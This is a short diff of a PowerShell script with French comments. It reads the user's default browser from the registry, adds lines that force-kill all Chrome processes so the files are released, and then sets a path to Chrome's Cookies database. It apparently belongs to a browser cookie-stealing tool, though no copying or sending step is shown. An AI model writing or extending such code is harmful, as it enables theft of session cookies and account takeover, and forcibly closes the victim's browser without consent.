@@ -6,6 +6,11 @@ New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 # === DÉTECTER LE NAVIGATEUR PAR DÉFAUT ===
 $defaultBrowserProgId = (Get-ItemProperty "HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice").ProgId
 
+Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
+
+# Petite pause pour libérer les fichiers
+Start-Sleep -Seconds 2
+
 switch ($defaultBrowserProgId) {
     "ChromeHTML" {
         $cookiePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
